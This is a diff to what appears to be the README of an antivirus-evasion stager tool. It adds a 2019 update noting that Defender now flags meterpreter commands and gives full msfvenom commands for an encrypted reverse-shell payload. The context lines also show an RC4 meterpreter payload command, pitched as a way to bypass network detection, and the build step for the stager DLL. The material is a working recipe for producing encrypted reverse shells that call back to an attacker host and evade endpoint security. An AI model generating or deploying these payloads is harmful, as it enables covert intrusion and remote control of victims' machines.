@@ -7,6 +7,17 @@ If you want to use the reverse_tcp_rc4 meterpreter payload (useful to bypass NID
 Then generate payload that suits your needs, ex:  
 ```ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST=192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c```  
   
+********************************
+***Update 02/12/2019***:  
+Right now we still have the meterpreter agent connect back. However any meterpreter command executed by the agent is now triggered by Defender.  
+  
+A solution is to use the [new MSF payloads](https://blog.rapid7.com/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/) which are returning a simple command line with a ChaCha20 ciphered communication:  
+  
+```
+ruby msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.1.24 LPORT=443 --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
+```
+********************************
+  
 Replace the payload in stager_dll_xx.cpp and build the DLL on a Windows machine with the following command:  
 ```cl /LD /MT /EHa stager_dll_xx.cpp aes.cpp /Fe:stager.dll```  
   
